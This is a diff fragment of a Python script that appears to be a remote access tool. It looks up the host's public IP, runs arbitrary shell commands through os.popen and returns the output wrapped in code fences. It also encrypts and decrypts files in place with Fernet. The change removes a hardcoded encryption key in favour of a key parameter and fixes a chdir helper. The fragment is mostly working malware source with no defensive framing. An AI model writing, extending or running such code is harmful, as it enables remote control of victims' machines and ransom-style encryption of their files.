@@ -13,10 +13,9 @@ try:
     public_ip = requests.get('https://api.ipify.org').text
 except Exception as e:
     public_ip = "Null"
-key = b'-XXPx0gJig0dDea3XaJO0MDJJO4BGc3xg7_MDY4wetk='
 
 def cd(location):
-    content = os.chdir(location).read()
+    content = os.chdir(location)
     return f"```{content}```"
 def cmd(content):
     content = os.popen(content).read()
@@ -30,7 +29,8 @@ def cmd(content):
         return f'{tmp}\\output.txt'
     else:
         return f"```{content}```"
-def encrypt(file):
+def encrypt(file, key):
+    
     f = open(file, 'rb')
     fernet = Fernet(key)
     original = f.read()
@@ -38,7 +38,8 @@ def encrypt(file):
     f = open(file, 'wb')
     f.write(encrypted)
     f.close()
-def decrypt(file):
+def decrypt(file, key):
+    
     f = open(file, 'rb')
     fernet = Fernet(key)
     encrypted = f.read()
